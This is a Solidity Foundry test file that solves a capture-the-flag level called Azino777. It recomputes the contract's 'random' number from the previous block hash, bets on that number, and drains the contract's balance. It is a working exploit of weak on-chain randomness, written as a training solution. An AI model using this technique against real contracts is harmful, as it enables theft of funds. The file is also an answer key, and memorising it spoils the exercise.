// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/01_Azino777/Azino777.sol";

// forge test --match-contract Azino777Test -vvvv
contract Azino777Test is BaseTest {
    Azino777 instance;

    function setUp() public override {
        super.setUp();
        instance = new Azino777{value: 0.01 ether}();
        vm.roll(43133);
    }

    function testExploitLevel() public {
        uint256 lastBlockHash = uint256(blockhash(block.number - 1));

        uint256 rawFactor = 1157920892373161954235709850086879078532699846656405640394575840079131296399;
        uint256 factor = (rawFactor * 100) / 100;
        uint256 predict = uint256((uint256(lastBlockHash) / factor)) % 100;

        instance.spin{value: 0.01 ether}(predict);
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
